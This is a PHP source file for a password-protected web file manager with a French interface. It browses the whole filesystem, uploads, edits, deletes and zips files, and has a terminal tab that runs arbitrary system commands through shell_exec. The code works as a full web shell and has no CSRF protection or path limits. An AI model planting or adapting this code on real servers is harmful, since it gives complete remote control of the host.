<?php ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); $storedPasswordHash = '$2y$10$C1YOoensnCCc8dg0.sDOlu/Zx83mxXXMc.ek.lJXLl0n2Xpvi3mzm'; session_start(); if (isset($_POST['logout'])) { session_unset(); session_destroy(); header('Location: ' . $_SERVER['PHP_SELF']); exit; } if (isset($_POST['password'])) { if (password_verify($_POST['password'], $storedPasswordHash)) { $_SESSION['authenticated'] = true; } else { die("Mot de passe incorrect."); } } if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) { ?><!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Connexion</title><style>body {font-family: 'Segoe UI', Arial, sans-serif;background-color: #121212;color: #e0e0e0;display: flex;justify-content: center;align-items: center;min-height: 100vh;margin: 0;}.login-form {background-color: #1a1a1a;padding: 2rem;border-radius: 12px;box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);width: 320px;text-align: center;}.login-form h2 {margin-bottom: 1.5rem;color: #f0f0f0;font-size: 1.8rem;}.login-form input[type="password"] {width: 100%;padding: 12px;margin-bottom: 1.2rem;border: 2px solid #333;border-radius: 6px;background-color: #2a2a2a;color: #fff;font-size: 1rem;transition: border-color 0.3s ease;}.login-form input[type="password"]:focus {outline: none;border-color: #1e90ff;}.login-form button {width: 50%;padding: 10px;background-color: #1e90ff;color: white;border: none;border-radius: 6px;cursor: pointer;font-size: 0.95rem;font-weight: 500;transition: background-color 0.3s ease,transform 0.2s ease;}.login-form button:hover {background-color: #0066cc;transform: scale(0.98);}.login-form button:active {transform: scale(0.95);}</style></head><body><div class="login-form"><h2>Connexion</h2><form method="post"><input type="password" name="password" placeholder="Mot de passe" required><button type="submit">Se connecter</button></form></div></body></html><?php exit;}if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {$directory = realpath(isset($_GET['dir']) ? $_GET['dir'] : (isset($_SERVER['WINDIR']) ? 'C:/' : '/'));$targetDir = $directory . DIRECTORY_SEPARATOR;$targetFile = $targetDir . basename($_FILES['uploaded_file']['name']);if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetFile)) {$uploadMessage = "<p style='color: #4CAF50;'>Fichier téléversé avec succès.</p>";} else {$uploadMessage = "<p style='color: #ff4444;'>Erreur lors du téléversement du fichier.</p>";}}function getWebPath($filePath) {$realPath = realpath($filePath);if (!$realPath) return null;$webPath = str_replace('\\', '/', $realPath);if (DIRECTORY_SEPARATOR === '\\') {$webPath = '/' . str_replace(':', '', $webPath);}return $webPath;}$directory = isset($_GET['dir']) ? $_GET['dir'] : (isset($_SERVER['WINDIR']) ? 'C:/' : '/');$directory = realpath($directory) ?: (isset($_SERVER['WINDIR']) ? 'C:/' : '/');$searchQuery = isset($_GET['search']) ? strtolower($_GET['search']) : '';$parentDirectory = dirname($directory);$executableExtensions = ['bat'];if (isset($_GET['execute'])) {$fileToExecute = realpath($_GET['execute']);if ($fileToExecute && file_exists($fileToExecute) && !is_dir($fileToExecute)) {$ext = strtolower(pathinfo($fileToExecute, PATHINFO_EXTENSION));if (in_array($ext, $executableExtensions)) {if (DIRECTORY_SEPARATOR === '\\') {$command = escapeshellcmd($fileToExecute);} else {$command = './' . escapeshellcmd($fileToExecute);}$output = shell_exec($command . ' 2>&1');echo "<div class='command-output'><pre>" . htmlspecialchars($output) . "</pre></div>";} else {echo "<div class='error'>Type de fichier non exécutable.</div>";}} else {echo "<div class='error'>Fichier non trouvé ou inaccessible.</div>";}}function getFileIcon($filePath) {if (is_dir($filePath)) {return '📁';}$ext = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));$icons = ['txt' => '📄', 'jpg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️','php' => '🐘', 'html' => '🌍', 'css' => '🎨', 'js' => '📜','pdf' => '📕', 'zip' => '📦', 'mp3' => '🎵', 'mp4' => '🎬','url' => '🔗', 'exe' => '⚙️', 'lnk' => '⛓️‍💥', 'mkv' => '🎬','bat' => '⚙️', 'docx' => '📄', 'xlsx' => '📊', 'pptx' => '📽️', 'odt' => '📄', 'odp' => '📽️', 'csv' => '📋', 'rar' => '📦', '7z' => '📦', 'json' => '🗄️', 'xml' => '🗄️', 'md' => '📝', 'dll' => '🛠️', 'ini' => '⚙️'];return $icons[$ext] ?? '❓';}function searchFilesRecursively($directory, $searchQuery) {$results = [];try {$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));foreach ($iterator as $file) {try {if ($file->isFile() && stripos($file->getFilename(), $searchQuery) !== false) {$results[] = $file->getPathname();}} catch (Exception $e) {continue;}}} catch (Exception $e) {return [];}return $results;}if (isset($_GET['delete'])) {$fileToDelete = realpath($_GET['delete']);if ($fileToDelete && file_exists($fileToDelete)) {if (is_dir($fileToDelete)) {rmdir($fileToDelete);} else {unlink($fileToDelete);}echo "Le fichier/dossier a été supprimé avec succès.";} else {echo "Le fichier/dossier spécifié n'existe pas ou n'est pas accessible.";}}if (isset($_GET['new_name']) && isset($_GET['file'])) {$fileToRename = realpath($_GET['file']);$newName = $_GET['new_name'];$newFilePath = dirname($fileToRename) . DIRECTORY_SEPARATOR . $newName;if (rename($fileToRename, $newFilePath)) {echo "Le fichier/dossier a été renommé avec succès.";} else {echo "Une erreur est survenue lors du renommage.";}}if (isset($_POST['edit_file']) && isset($_POST['content'])) {$fileToEdit = realpath($_POST['edit_file']);if ($fileToEdit && file_exists($fileToEdit) && !is_dir($fileToEdit)) {file_put_contents($fileToEdit, $_POST['content']);echo "Le fichier a été modifié avec succès.";} else {echo "Le fichier spécifié n'existe pas ou n'est pas accessible.";}}if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {if (session_status() === PHP_SESSION_NONE) {session_start();}if (!isset($_SESSION['current_path'])) {$_SESSION['current_path'] = "C:\\wamp64\\www\\file_explorere-main";}$command = trim($_POST['command']);$cmd = "cd " . escapeshellarg($_SESSION['current_path']) . " && " . $command . " 2>&1";$output = shell_exec("cmd /c " . $cmd);if ($output) {echo nl2br(htmlspecialchars($output));} else {echo "Commande exécutée sans sortie";}if (preg_match('/^cd\s+(.+)/', $command, $matches)) {$new_path = realpath($_SESSION['current_path'] . DIRECTORY_SEPARATOR . $matches[1]);if ($new_path && is_dir($new_path)) {$_SESSION['current_path'] = $new_path;}}exit();}if (isset($_GET['download_dir'])) {$dirToDownload = realpath($_GET['download_dir']);if ($dirToDownload && is_dir($dirToDownload)) {$zipFileName = basename($dirToDownload) . '.zip';$zipFilePath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipFileName;$zip = new ZipArchive();if ($zip->open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dirToDownload),RecursiveIteratorIterator::LEAVES_ONLY);foreach ($files as $name => $file) {if (!$file->isDir()) {$filePath = $file->getRealPath();$relativePath = substr($filePath, strlen($dirToDownload) + 1);$zip->addFile($filePath, $relativePath);}}$zip->close();header('Content-Type: application/zip');header('Content-Disposition: attachment; filename="' . $zipFileName . '"');header('Content-Length: ' . filesize($zipFilePath));readfile($zipFilePath);unlink($zipFilePath);exit;} else {echo "Erreur lors de la création du fichier ZIP.";}} else {echo "Le dossier spécifié n'existe pas ou n'est pas accessible.";}}?><!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Explorateur de fichiers système</title><link rel="stylesheet" href="style.css"><style>body {background-color: #121212;color: #e0e0e0;font-family: 'Segoe UI', Arial, sans-serif;margin: 20px;}h2 {color: #ffffff;margin-bottom: 15px;}.warning {color: #ff4444;font-weight: bold;padding: 10px;background-color: #2a2a2a;border-radius: 4px;}a {color: #1e90ff;text-decoration: none;transition: color 0.3s ease;}a:hover {color: #63b4ff;text-decoration: underline;}input[type="text"] {background-color: #333;color: #fff;border: 1px solid #444;padding: 8px;width: 300px;border-radius: 4px;margin-right: 10px;}button {background-color: #333;color: #fff;border: 1px solid #444;padding: 8px 15px;cursor: pointer;border-radius: 4px;transition: background-color 0.3s ease;}button:hover {background-color: #555;}form {margin-bottom: 25px;}ul {list-style-type: none;padding: 0;margin: 0;}.file-item {padding: 12px;background-color: #1a1a1a;margin-bottom: 8px;border-radius: 4px;display: flex;align-items: center;transition: background-color 0.2s ease;}.file-item:hover {background-color: #252525;}.file-item span[role="img"] {font-family: 'Segoe UI Emoji', 'Apple Color Emoji', sans-serif;margin-right: 10px;font-size: 1.2em;}.file-actions {margin-left: auto;font-size: 0.9em;}.file-actions a {color: #888;margin-left: 15px;white-space: nowrap;}.file-actions a:hover {color: #1e90ff;}textarea {width: 100%;background-color: #1a1a1a;color: #fff;border: 1px solid #333;padding: 10px;border-radius: 4px;font-family: monospace;min-height: 400px;}small {color: #888;font-size: 0.8em;margin-left: 10px;}.logout-btn {position: fixed;top: 20px;right: 20px;background-color: #ff4444;color: white;border: none;padding: 10px 20px;border-radius: 5px;cursor: pointer;z-index: 1000;}.logout-btn:hover {background-color: #cc0000;}.upload-form {margin: 20px 0;padding: 15px;width: 90%;background-color: #1a1a1a;border-radius: 8px;display: flex;gap: 10px;}.upload-form input[type="file"] {padding: 8px;background: #2a2a2a;border: 1px solid #444;border-radius: 4px;color: #fff;flex-grow: 1;}.upload-form button {padding: 8px 15px;background: #1e90ff;border: none;border-radius: 4px;color: white;cursor: pointer;transition: background-color 0.3s;}.upload-form button:hover {background-color: #0066cc;}.tabs {background-color:rgb(43, 43, 43);border-radius: 10px;display: flex;gap: 10px;width: 10%;justify-content: space-evenly;transition: background-color 0.3s ease;}.tabs div {padding: 10px;border-radius: 10px;transition: background-color 0.3s ease;}.tabs div.active {background-color: rgb(73, 73, 73);border-radius: 10px;transition: background-color 0.3s ease;}.tabs div:hover {background-color: rgb(60, 60, 60);border-radius: 10px;cursor: pointer;transition: background-color 0.3s ease;}.tab-content-container div.content-tab:not(.active-tab) {display: none;}.terminal-container {background-color: #000;color: #0f0;padding: 20px;border-radius: 8px;max-width: 600px;margin: auto;box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);}.terminal-header {color: #4CAF50;font-size: 1.2em;margin-bottom: 10px;border-bottom: 1px solid #333;padding-bottom: 5px;}.terminal-output {background-color: #111;padding: 10px;border-radius: 4px;min-height: 200px;max-height: 400px;overflow-y: auto;white-space: pre-wrap;border: 1px solid #444;}.terminal-command-line {display: flex;align-items: center;margin-top: 15px;}.terminal-prompt {color: #4CAF50;font-weight: bold;margin-right: 10px;}.terminal-input {flex-grow: 1;background: #000;border: 1px solid #444;color: #0f0;padding: 8px 12px;border-radius: 4px;font-size: 1em;}.terminal-button {background: #4CAF50;border: none;padding: 8px 12px;cursor: pointer;color: white;border-radius: 4px;margin-left: 5px;}.terminal-history {color: #888;}.terminal-error {color: red;}</style></head><body><form method="post"><button type="submit" name="logout" class="logout-btn">Déconnexion</button></form><div class="tabs"><div class="tab active" data-tab="files">Files</div><div class="tab" data-tab="terminal">Terminal</div></div><div class="tab-content-container"><div class="content-tab active-tab" data-tab="files"><?php if(isset($uploadMessage)) echo $uploadMessage; ?><h2>Explorateur de fichiers système</h2><p class="warning">Attention : Accès complet au système activé</p><p>Répertoire actuel: <?php echo htmlspecialchars($directory); ?></p><form class="upload-form" method="post" enctype="multipart/form-data"><input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>"><input type="file" name="uploaded_file" required><button type="submit">📤 Téléverser</button></form><form action="" method="get"><input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>"><input type="text" name="search" placeholder="Rechercher un fichier..." value="<?php echo htmlspecialchars($searchQuery); ?>"><button type="submit">🔍 Rechercher</button></form><?php if ($parentDirectory !== $directory): ?><form action="" method="get"><input type="hidden" name="dir" value="<?php echo htmlspecialchars($parentDirectory); ?>"><button type="submit">⬆️ Remonter</button></form><?php endif; ?><ul><?php if (!empty($searchQuery)) {$searchResults = searchFilesRecursively($directory, $searchQuery);foreach ($searchResults as $filePath):$webPath = getWebPath($filePath);if (!$webPath) continue;$ext = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));?><li class="file-item"><?php echo getFileIcon($filePath); ?><?php echo htmlspecialchars(basename($filePath)); ?><span class="file-actions">[ <a href="<?php echo htmlspecialchars($webPath); ?>" download>Télécharger</a> | <a href="?dir=<?php echo htmlspecialchars(urlencode(dirname($filePath))); ?>&edit=<?php echo htmlspecialchars(urlencode($filePath)); ?>">Modifier</a> | <?php if (in_array($ext, $executableExtensions)): ?><a href="?dir=<?php echo htmlspecialchars(urlencode(dirname($filePath))); ?>&execute=<?php echo htmlspecialchars(urlencode($filePath)); ?>" onclick="return confirm('Exécuter ce fichier ?')">Exécuter</a> | <?php endif; ?><a href="?dir=<?php echo htmlspecialchars(urlencode(dirname($filePath))); ?>&rename=<?php echo htmlspecialchars(urlencode($filePath)); ?>">Renommer</a> |<a href="?dir=<?php echo htmlspecialchars(urlencode(dirname($filePath))); ?>&delete=<?php echo htmlspecialchars(urlencode($filePath)); ?>" onclick="return confirm('Êtes-vous sûr ?')">Supprimer</a> ]</span></li><?php endforeach;} else {try {$files = scandir($directory);foreach ($files as $file):if ($file === '.' || $file === '..') continue;$path = $directory . DIRECTORY_SEPARATOR . $file;$isDir = is_dir($path);$webPath = getWebPath($path);if (!$webPath) continue;$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));?><li class="file-item"><?php echo getFileIcon($path); ?><?php if ($isDir): ?><a href="?dir=<?php echo htmlspecialchars(urlencode($path)); ?>"><?php echo htmlspecialchars($file); ?></a><?php else: ?><?php echo htmlspecialchars($file); ?><?php endif; ?><span class="file-actions">[ <?php if ($isDir): ?><a href="?dir=<?php echo htmlspecialchars(urlencode($directory)); ?>&download_dir=<?php echo htmlspecialchars(urlencode($path)); ?>">Télécharger</a> | <?php else: ?><a href="<?php echo htmlspecialchars($webPath); ?>" download>Télécharger</a> | <a href="?dir=<?php echo htmlspecialchars(urlencode($directory)); ?>&edit=<?php echo htmlspecialchars(urlencode($path)); ?>">Modifier</a> | <?php if (in_array($ext, $executableExtensions)): ?><a href="?dir=<?php echo htmlspecialchars(urlencode($directory)); ?>&execute=<?php echo htmlspecialchars(urlencode($path)); ?>" onclick="return confirm('Exécuter ce fichier ?')">Exécuter</a> | <?php endif; ?><?php endif; ?><a href="?dir=<?php echo htmlspecialchars(urlencode($directory)); ?>&rename=<?php echo htmlspecialchars(urlencode($path)); ?>">Renommer</a> |<a href="?dir=<?php echo htmlspecialchars(urlencode($directory)); ?>&delete=<?php echo htmlspecialchars(urlencode($path)); ?>" onclick="return confirm('Êtes-vous sûr ?')">Supprimer</a> ]</span></li><?php endforeach;} catch (Exception $e) {echo "<li class='warning'>Impossible de lire ce répertoire</li>";}}?></ul><?php if (isset($_GET['edit'])): ?><?php $fileToEdit = realpath($_GET['edit']); ?><?php if ($fileToEdit && file_exists($fileToEdit) && !is_dir($fileToEdit)): ?><h3>Modifier le fichier: <?php echo htmlspecialchars(basename($fileToEdit)); ?></h3><form action="" method="post"><textarea name="content" rows="20" cols="80"><?php echo htmlspecialchars(file_get_contents($fileToEdit)); ?></textarea><input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($fileToEdit); ?>"><button type="submit">Enregistrer</button></form><?php else: ?><p>Le fichier spécifié n'existe pas ou n'est pas accessible.</p><?php endif; ?><?php endif; ?><?php if (isset($_GET['rename'])): ?><?php $fileToRename = realpath($_GET['rename']); ?><?php if ($fileToRename && file_exists($fileToRename)): ?><h3>Renommer le fichier/dossier: <?php echo htmlspecialchars(basename($fileToRename)); ?></h3><form action="" method="get"><input type="text" name="new_name" value="<?php echo htmlspecialchars(basename($fileToRename)); ?>"><input type="hidden" name="file" value="<?php echo htmlspecialchars($fileToRename); ?>"><input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>"><button type="submit">Renommer</button></form><?php else: ?><p>Le fichier/dossier spécifié n'existe pas ou n'est pas accessible.</p><?php endif; ?><?php endif; ?></div><div class="content-tab" data-tab="terminal"><h2>Terminal</h2><p class="warning">Attention : Accès complet au système activé</p><div class="terminal-container"><div class="terminal-header">💻 Terminal</div><div class="terminal-output" id="terminalOutput"></div><form id="terminalForm"><div class="terminal-command-line"><span class="terminal-prompt">$</span><input type="text" name="command" class="terminal-input" id="commandInput"placeholder="Entrez une commande système..." autofocus autocomplete="off"><button type="submit" class="terminal-button">Exécuter</button></div></form></div></div><script>const terminalForm = document.getElementById('terminalForm');const commandInput = document.getElementById('commandInput');const terminalOutput = document.getElementById('terminalOutput');let commandHistory = [];let historyIndex = -1;terminalForm.addEventListener('submit', async (e) => {e.preventDefault();const command = commandInput.value.trim();if (!command) return;commandHistory.push(command);historyIndex = commandHistory.length;terminalOutput.innerHTML += `<div class="terminal-history">$ ${command}</div>`;try {const response = await fetch('', {method: 'POST',headers: { 'Content-Type': 'application/x-www-form-urlencoded' },body: new URLSearchParams({ command })});const result = await response.text();terminalOutput.innerHTML += `<div>${result}</div>`;} catch (error) {terminalOutput.innerHTML += `<div class="terminal-error">Erreur: ${error.message}</div>`;}commandInput.value = '';terminalOutput.scrollTop = terminalOutput.scrollHeight;});commandInput.addEventListener('keydown', (e) => {if (e.key === 'ArrowUp' && historyIndex > 0) {historyIndex--;commandInput.value = commandHistory[historyIndex];}if (e.key === 'ArrowDown' && historyIndex < commandHistory.length - 1) {historyIndex++;commandInput.value = commandHistory[historyIndex];}});</script></div><script>document.addEventListener('DOMContentLoaded', () => {const urlParams = new URLSearchParams(window.location.search);const activeTab = urlParams.get('tab') || 'files';setActiveTab(activeTab);document.querySelectorAll('.tab').forEach(tab => {tab.addEventListener('click', () => {const tabName = tab.getAttribute('data-tab');setActiveTab(tabName);history.replaceState(null, '', `?tab=${tabName}`);});});});function setActiveTab(tabName) {document.querySelectorAll('.tab').forEach(tab => {tab.classList.remove('active');});document.querySelectorAll('.content-tab').forEach(tab => {tab.classList.remove('active-tab');});const activeTabElement = document.querySelector(`.tab[data-tab="${tabName}"]`);if (activeTabElement) {activeTabElement.classList.add('active');}const newTabElement = document.querySelector(`.content-tab[data-tab="${tabName}"]`);if (newTabElement) {newTabElement.classList.add('active-tab');}}</script></body></html>